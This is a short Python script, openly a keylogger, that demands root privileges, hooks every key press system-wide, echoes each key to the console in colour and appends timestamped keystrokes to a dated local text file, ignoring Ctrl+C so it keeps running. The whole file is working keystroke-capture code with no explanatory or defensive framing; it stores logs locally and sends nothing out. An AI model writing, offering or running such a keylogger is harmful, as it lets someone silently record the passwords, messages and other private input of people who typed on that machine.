import keyboard
from os import geteuid
from datetime import date
from time import strftime, localtime
from colorama import Fore, Style, Back

status_color = {
    "+": Fore.GREEN,            # Success
    "-": Fore.RED,              # Failure
    "*": Fore.YELLOW,           # Warning
    ":": Fore.CYAN,             # Info
    " ": Fore.WHITE             # Normal
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def check_root():
	return geteuid() == 0
class keylogger:
    def __init__(self):
        self.file_name = str(date.today()) + "_" + strftime('%H_%M_%S', localtime()) + ".txt"
        keyboard.on_press(callback=self.write)
        while True:
            try:
                keyboard.wait()
            except KeyboardInterrupt:
                pass
    def write(self, event):
        log = f"[{date.today()}] [{strftime('%H:%M:%S', localtime())}] : {event.name}\n"
        display('+', f"{Back.MAGENTA}{event.name}{Back.RESET}")
        with open(self.file_name, 'a') as file:
            file.write(log)

if __name__ == "__main__":
    if not check_root():
        display('-', f"This Program requires {Back.MAGENTA}root{Back.RESET} Privileges")
        exit(0)
    listener = keylogger()